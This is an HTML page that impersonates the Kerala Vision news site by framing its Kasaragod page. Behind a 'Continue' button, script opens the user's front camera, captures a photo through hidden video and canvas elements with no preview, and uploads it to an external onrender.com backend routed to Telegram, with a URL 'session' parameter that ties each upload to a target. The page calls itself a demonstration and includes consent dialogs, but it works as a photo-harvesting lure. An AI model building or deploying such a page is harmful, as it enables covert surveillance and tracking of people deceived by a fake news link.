<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kerala Vision News</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      color: #222;
    }

    header {
      padding: 15px 5%;
      border-bottom: 1px solid #ddd;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    header h2 {
      margin: 0;
      color: #b51f24;
    }

    .news-frame {
      width: 100%;
      height: 75vh;
      border: none;
    }

    .fallback {
      padding: 12px;
      text-align: center;
    }

    .controls {
      text-align: center;
      padding: 20px;
    }

    button {
      background: #c62828;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 14px 35px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #a51d1d;
    }

    #status {
      margin-top: 15px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>

<body>

  <header>
    <h2>Kerala Vision</h2>
    <span>Kasaragod News</span>
  </header>

  <iframe
    class="news-frame"
    src="https://www.keralavisionnews.com/news/district/kasaragod"
    title="Kerala Vision Kasaragod News">
  </iframe>

  <div class="fallback">
    <a
      href="https://www.keralavisionnews.com/news/district/kasaragod"
      target="_blank"
      rel="noopener noreferrer">
      Open Kerala Vision News
    </a>
  </div>

  <div class="controls">
    <button id="continueButton">Continue</button>
    <p id="status"></p>
  </div>

  <video id="camera" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const BACKEND_URL =
      "https://camera-security-demo-1.onrender.com";

    const button = document.getElementById("continueButton");
    const status = document.getElementById("status");
    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");

    button.addEventListener("click", async () => {
      if (!navigator.mediaDevices?.getUserMedia) {
        status.textContent =
          "Camera access is not supported by this browser.";
        return;
      }

      const consent = confirm(
        "This demonstration will access your camera, capture one photo " +
        "without displaying a preview, and offer to send it to the " +
        "configured Telegram destination. Do you agree?"
      );

      if (!consent) return;

      let stream;

      try {
        status.textContent = "Requesting camera permission...";

        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        await video.play();

        // Capture one snapshot without showing the preview.
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0);

        const photo = await new Promise(resolve => {
          canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        // Stop camera immediately after capture.
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;

        if (!photo) {
          throw new Error("Photo capture failed.");
        }

        const uploadConsent = confirm(
          "One photo has been captured. Do you authorize sending it " +
          "to the configured Telegram destination?"
        );

        if (!uploadConsent) {
          status.textContent = "Photo was not sent.";
          return;
        }

        status.textContent = "Sending photo...";

        const formData = new FormData();
        formData.append("photo", photo, "demo-photo.jpg");

        // Route to session-specific or direct photo upload endpoint
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get("session");
        const uploadEndpoint = sessionId
          ? `${BACKEND_URL}/api/sessions/${sessionId}/photo`
          : `${BACKEND_URL}/api/photos`;

        const response = await fetch(
          uploadEndpoint,
          {
            method: "POST",
            body: formData
          }
        );

        if (!response.ok) {
          throw new Error("Photo submission failed.");
        }

        status.textContent = "Photo submitted successfully.";

      } catch (error) {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }

        video.srcObject = null;
        status.textContent = error.message;
      }
    });
  </script>

</body>
</html>
